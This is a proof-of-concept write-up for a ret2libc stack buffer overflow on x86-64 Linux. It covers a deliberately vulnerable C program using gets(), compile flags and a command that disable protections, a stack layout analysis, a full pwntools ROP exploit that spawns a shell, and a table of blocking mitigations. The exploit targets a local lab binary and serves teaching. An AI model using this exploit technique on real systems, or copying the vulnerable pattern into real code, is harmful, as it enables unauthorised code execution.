# Buffer Overflow PoC — ret2libc on x86-64 Linux

## Overview

Demonstrated a classic stack buffer overflow exploiting a vulnerable C program to spawn a shell via ret2libc ROP chain.

**Environment:** Ubuntu x86-64, ASLR disabled, pwntools

---

## Vulnerable Program

```c
// buffer_overflow.c
#include <stdio.h>

void vulnerable() {
    char buf[64];
    gets(buf);  // no bounds check, reads from stdin
}

int main() {
    vulnerable();
    return 0;
}
```

### Compile (mitigations disabled for PoC)

```bash
gcc buffer_overflow.c -o vulnerable \
    -fno-stack-protector \
    -no-pie \
    -z norelro \
    -fcf-protection=none \
    -w
```

### Verify mitigations

```bash
checksec --file=./vulnerable
# Stack:  No canary found
# PIE:    No PIE (0x400000)
# RELRO:  No RELRO
# NX:     NX enabled
```

### Disable ASLR

```bash
echo 0 | sudo tee /proc/sys/kernel/randomize_va_space
```

---

## Stack Layout Analysis

```bash
objdump -d -Mintel ./vulnerable | grep -A 15 "<vulnerable>"
```

Key lines:

```asm
sub rsp, 0x50           ; 80 bytes allocated
lea rax, [rbp-0x40]     ; buf starts at rbp-0x40 (64 bytes below rbp)
```

Stack layout:

```
rbp + 0x08  ← return address   ┐
rbp + 0x00  ← saved rbp        │  offset = 64 + 8 = 72 bytes
rbp - 0x40  ← buf[0]           ┘
rbp - 0x50  ← bottom of frame
```

Padding to reach return address: **72 bytes**

---

## Exploit Strategy — ret2libc ROP Chain

Since NX is enabled (no shellcode on stack), use ROP to call `system("/bin/sh")`:

1. Overflow 72 bytes to reach the return address
2. Overwrite return address with `pop rdi; ret` gadget
3. Place `/bin/sh` address — gadget pops it into `rdi` (first argument)
4. Add bare `ret` gadget for 16-byte stack alignment
5. Place `system()` address — called with `rdi = "/bin/sh"`

```
Stack after overflow:
┌─────────────────┐
│  A * 72         │  padding
├─────────────────┤
│  pop_rdi_addr   │  ret jumps here → "pop rdi; ret"
├─────────────────┤
│  bin_sh_addr    │  popped into rdi by gadget
├─────────────────┤
│  ret_addr       │  stack alignment fix
├─────────────────┤
│  system_addr    │  system("/bin/sh") called
└─────────────────┘
```

---

## Exploit Script

```python
# buffer_overflow_exploit.py
from pwn import *

context.arch      = "amd64"
context.log_level = "info"

elf  = ELF("./vulnerable")
libc = ELF("/lib/x86_64-linux-gnu/libc.so.6")

# Launch process and resolve libc base from /proc/<pid>/maps
p = process("./vulnerable")
libs = p.libs()
libc_path = [k for k in libs.keys() if "libc" in k and ".so" in k][0]
libc.address = libs[libc_path]

# Resolve addresses (offsets + libc base)
rop_libc     = ROP(libc)
pop_rdi_addr = rop_libc.find_gadget(["pop rdi", "ret"])[0]
ret_addr     = rop_libc.find_gadget(["ret"])[0]
bin_sh_addr  = next(libc.search(b"/bin/sh"))
system_addr  = libc.sym["system"]

# Build payload
payload  = b"A" * 72
payload += p64(pop_rdi_addr)  # overwrite return address
payload += p64(bin_sh_addr)   # rdi = "/bin/sh"
payload += p64(ret_addr)      # stack alignment
payload += p64(system_addr)   # system("/bin/sh")

p.sendline(payload)
p.interactive()
```

---

## Result

```
~/dev/exploit$ python3 buffer_overflow_exploit.py 
[*] '/home/balazs/dev/exploit/vulnerable'
    Arch:       amd64-64-little
    RELRO:      No RELRO
    Stack:      No canary found
    NX:         NX enabled
    PIE:        No PIE (0x400000)
    Stripped:   No
[*] '/lib/x86_64-linux-gnu/libc.so.6'
    Arch:       amd64-64-little
    RELRO:      Full RELRO
    Stack:      Canary found
    NX:         NX enabled
    PIE:        PIE enabled
    FORTIFY:    Enabled
    SHSTK:      Enabled
    IBT:        Enabled
[+] Starting local process './vulnerable': pid 11454
libc base: 0x7ffff7c00000
[*] Loaded 111 cached gadgets for '/lib/x86_64-linux-gnu/libc.so.6'
pop rdi: 0x7ffff7d0f78b
ret    : 0x7ffff7c2882f
/bin/sh: 0x7ffff7dcb42f
system : 0x7ffff7c58750
[*] Switching to interactive mode
$ ls
buffer_overflow.c  buffer_overflow_exploit.py  vulnerable

```

Shell spawned successfully.

---

## Mitigations That Would Block This

| Mitigation | Effect |
|---|---|
| Stack canary | Detects overflow before `ret`, aborts |
| PIE | Randomizes binary base, gadget addresses unknown |
| ASLR | Randomizes libc base, need info leak first |
| SHSTK/CET | Shadow stack detects return address tampering |

---

## Tools Used

- [pwntools](https://github.com/Gallopsled/pwntools) — exploit framework (`pip install pwntools`)
- [ROPgadget](https://github.com/JonathanSalwan/ROPgadget) — ROP gadget finder (`pip install ropgadget`)
- `checksec` — binary mitigation checker (bundled with pwntools)
- `objdump` — disassembler for stack layout analysis